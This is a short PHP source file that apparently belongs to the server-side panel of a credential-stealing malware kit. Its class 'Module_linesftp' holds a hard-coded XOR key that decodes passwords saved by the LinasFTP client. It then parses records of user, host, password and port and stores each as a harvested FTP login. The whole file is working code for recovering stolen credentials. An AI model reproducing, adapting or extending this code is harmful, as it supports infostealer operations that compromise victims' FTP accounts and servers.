<?php

class Module_linesftp extends Module_
{
    private function Decrypt($Password)
    {
        $Password = trim($Password);

        if (strlen($Password) == 0 || (strlen($Password) % 3) != 0 || !IsNum($Password))
            return '';

        $Result = '';
        $XORKey_ = 'LINASFTP1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $start = idiv(strlen($Password), 3);
        for ($i = 0; $i < idiv(strlen($Password), 3); $i++)
        {
            $enc_char = intval(substr($Password, $i*3, 3));
            $Result .= chr(ord($XORKey_[($start+$i)%strlen($XORKey_)]) ^ $enc_char);
        }

        return $Result;
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
			$stream = new Stream($Data);
			while(TRUE)
			{
				$User	= $stream->getSTRING_();
				if($User == NULL)
					break;

				$Host 	= $stream->getSTRING_();
				$Pass	= $this->Decrypt($stream->getSTRING_());
				$Port	= $stream->getSTRING_();

				$this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
			}
			$stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
